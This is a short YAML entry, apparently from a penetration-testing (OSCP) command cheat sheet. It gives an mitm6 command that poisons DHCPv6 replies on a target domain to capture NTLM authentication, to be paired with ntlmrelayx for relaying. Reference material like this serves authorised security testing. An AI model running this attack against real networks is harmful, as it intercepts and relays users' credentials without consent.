---
command: |
  mitm6 -d $DOMAIN --ignore-nofqnd
description: Poison DHCPv6 replies to capture NTLM authentication (pair with ntlmrelayx).
os: [Linux]
category: [oscp, cli]
service: [DNS]
phase: [Exploitation]
references:
  - https://github.com/dirkjanm/mitm6
---
